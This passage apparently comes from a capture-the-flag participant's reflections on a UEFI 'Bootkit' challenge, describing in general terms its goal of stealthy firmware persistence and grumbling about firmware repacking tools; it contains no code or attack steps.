I think, few have thought of before. From that, Bootkit is combination of a
harder Lua.efi, plus a harder SMM Is Asleep, but Bootkit is hard in that it's
more like a difficult programming challenge. You know the security has already
been breached, the problem is reaching that point where you have persistence
with near-undetectability, with control over the root of trust, where you can
even fool the TPM if you want. To reach this point I learned about not just
UEFI, but also kernel, QEMU, and even TPM. It's incredibly satisfying when I
solved this chal myself.

Though, I do wish there's an actual firmware repacker that actually works :tm:
that isn't an old deprecated version of UEFITool that forces me to install QT
even though it's a command-line tool...
